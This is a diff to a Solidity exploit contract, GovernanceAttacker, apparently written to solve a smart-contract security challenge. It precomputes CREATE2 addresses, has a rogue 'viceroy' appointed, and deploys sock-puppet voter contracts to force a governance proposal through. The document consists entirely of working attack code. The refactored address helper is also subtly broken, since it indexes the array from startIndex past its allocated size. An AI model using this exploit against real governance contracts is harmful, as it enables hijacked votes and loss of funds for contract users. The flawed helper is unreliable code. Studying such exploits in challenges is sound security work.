@@ -131,29 +131,29 @@ contract GovernanceAttacker {
         uint256 proposalId = uint256(keccak256(proposal));
 
         uint nonce = 1;
-        address[] memory preCalcedVoters = getPreCalculatedAddresses(type(AttackerVoter).creationCode, 5);
-        bytes memory viceroyCreationCode = abi.encodePacked(
+        address[] memory preCalcedVotersA = getPreCalculatedAddresses(type(AttackerVoter).creationCode, 0, 5);
+        bytes memory viceroyCreationCodeA = abi.encodePacked(
             type(AttackerViceroy).creationCode,
-            abi.encode(governance, proposal, preCalcedVoters)
+            abi.encode(governance, proposal, preCalcedVotersA)
         );
-        address preCalcedViceroy = getCreate2Address(viceroyCreationCode, nonce);
+        address preCalcedViceroyA = getCreate2Address(viceroyCreationCodeA, nonce);
 
         // elect viceroy
-        governance.appointViceroy(preCalcedViceroy, nonce);
+        governance.appointViceroy(preCalcedViceroyA, nonce);
 
         // deploy viceroy
-        AttackerViceroy viceroy = new AttackerViceroy{salt: bytes32(nonce)}(governance, proposal, preCalcedVoters);
-        assert(address(viceroy) == preCalcedViceroy);
+        AttackerViceroy viceroyA = new AttackerViceroy{salt: bytes32(nonce)}(governance, proposal, preCalcedVotersA);
+        assert(address(viceroyA) == preCalcedViceroyA);
 
         // deploy voter
         deployVoters(5);
 
         // vote
-        for (uint i; i < preCalcedVoters.length; i++) {
-            AttackerVoter(preCalcedVoters[i]).vote(governance, proposalId, address(viceroy));
+        for (uint i; i < preCalcedVotersA.length; i++) {
+            AttackerVoter(preCalcedVotersA[i]).vote(governance, proposalId, address(viceroyA));
         }
         (uint votes, ) = governance.proposals(proposalId);
-        assert(votes == preCalcedVoters.length);
+        assert(votes == preCalcedVotersA.length);
     }
 
     function deployVoters(uint num) public {
@@ -162,9 +162,13 @@ contract GovernanceAttacker {
         }
     }
 
-    function getPreCalculatedAddresses(bytes memory bytecode, uint num) internal view returns (address[] memory) {
-        address[] memory addresses = new address[](num);
-        for (uint i; i < num; i++) {
+    function getPreCalculatedAddresses(
+        bytes memory bytecode,
+        uint startIndex,
+        uint endIndex
+    ) internal view returns (address[] memory) {
+        address[] memory addresses = new address[](endIndex - startIndex);
+        for (uint i = startIndex; i < endIndex; i++) {
             addresses[i] = getCreate2Address(bytecode, i);
         }
         return addresses;
